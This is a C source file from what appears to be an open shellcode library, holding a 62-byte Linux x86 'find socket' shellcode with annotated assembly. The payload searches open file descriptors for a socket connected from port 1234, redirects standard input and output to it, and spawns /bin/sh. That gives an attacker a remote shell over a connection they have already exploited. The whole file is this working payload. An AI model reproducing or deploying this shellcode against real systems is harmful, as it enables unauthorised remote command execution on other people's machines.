/*
 *  $Id: lin-x86-fndsockcode.c 40 2008-11-17 02:45:30Z ramon $
 *
 *  lin-x86-fndsockcode.c
 *  Copyright 2006 Ramon de Carvalho Valle <ramon@risesecurity.org>
 *
 *  This library is free software; you can redistribute it and/or
 *  modify it under the terms of the GNU Lesser General Public
 *  License as published by the Free Software Foundation; either
 *  version 2.1 of the License, or (at your option) any later version.
 *
 *  This library is distributed in the hope that it will be useful,
 *  but WITHOUT ANY WARRANTY; without even the implied warranty of
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
 *  Lesser General Public License for more details.
 *
 *  You should have received a copy of the GNU Lesser General Public
 *  License along with this library; if not, write to the Free Software
 *  Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301  USA
 *
 */

#define FNDSOCKPORT 25

char fndsockcode[]=         /*  62 bytes                          */
    "\x31\xdb"              /*  xorl    %ebx,%ebx                 */
    "\x53"                  /*  pushl   %ebx                      */
    "\x89\xe7"              /*  movl    %esp,%edi                 */
    "\x6a\x10"              /*  pushl   $0x10                     */
    "\x54"                  /*  pushl   %esp                      */
    "\x57"                  /*  pushl   %edi                      */
    "\x53"                  /*  pushl   %ebx                      */
    "\x89\xe1"              /*  movl    %esp,%ecx                 */
    "\xb3\x07"              /*  movb    $0x07,%bl                 */
    "\xff\x01"              /*  incl    (%ecx)                    */
    "\x6a\x66"              /*  pushl   $0x66                     */
    "\x58"                  /*  popl    %eax                      */
    "\xcd\x80"              /*  int     $0x80                     */
    "\x66\x81\x7f\x02\x04\xd2"/*  cmpw    $0xd204,0x02(%edi)        */
    "\x75\xf1"              /*  jne     <fndsockcode+14>          */
    "\x5b"                  /*  popl    %ebx                      */
    "\x6a\x02"              /*  pushl   $0x02                     */
    "\x59"                  /*  popl    %ecx                      */
    "\xb0\x3f"              /*  movb    $0x3f,%al                 */
    "\xcd\x80"              /*  int     $0x80                     */
    "\x49"                  /*  decl    %ecx                      */
    "\x79\xf9"              /*  jns     <fndsockcode+33>          */
    "\x50"                  /*  pushl   %eax                      */
    "\x68\x2f\x2f\x73\x68"  /*  pushl   $0x68732f2f               */
    "\x68\x2f\x62\x69\x6e"  /*  pushl   $0x6e69622f               */
    "\x89\xe3"              /*  movl    %esp,%ebx                 */
    "\x50"                  /*  pushl   %eax                      */
    "\x53"                  /*  pushl   %ebx                      */
    "\x89\xe1"              /*  movl    %esp,%ecx                 */
    "\x99"                  /*  cltd                              */
    "\xb0\x0b"              /*  movb    $0x0b,%al                 */
    "\xcd\x80"              /*  int     $0x80                     */
;

